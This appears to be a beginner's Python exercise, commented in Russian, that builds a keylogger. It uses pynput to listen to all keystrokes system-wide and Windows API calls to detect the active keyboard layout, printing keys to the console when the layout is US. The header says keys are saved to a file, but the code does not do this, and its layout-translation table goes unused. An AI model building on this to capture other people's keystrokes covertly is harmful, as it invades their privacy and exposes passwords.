'''ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл'''
from pynput import keyboard
import ctypes

# издевательство, перевод с англ раскладки на РУ
dict_key = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
    'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д', ';': 'ж',
    'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.',
    '[': 'х', ']': 'ъ', '`': 'ё', '\\': '\\', "'": 'э'
}

# словарь кодов ЯЗЫКОВ
dict_langs = {
    0x0409: "US",
    0x0419: "RU"
}


class LanguageQual:
    '''КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ'''
    def keyboardLayout(self):
        # хндл главного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # нить исполняемого данного окна ID
        nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # хндл нити. Этот хендл представляет код раскладки клавиатуры для данной нити.
        hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)

        lang_id = hndl_nit & 0xFFFF
        return lang_id


class KeyboardPrint(LanguageQual):
    '''КЕЙЛОГЕР, КЛАСС СОЗДАНИЯ'''
    def on_press(self, key):
        lang_id = self.keyboardLayout()
        current_lang = dict_langs.get(lang_id, 'ERROR')

        if current_lang == 'US':
            print(f'Press - {key}')

    def key_print(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    k = KeyboardPrint()  # Создание экземпляра класса
    print(k.key_print())  # Вызов метода у экземпляра




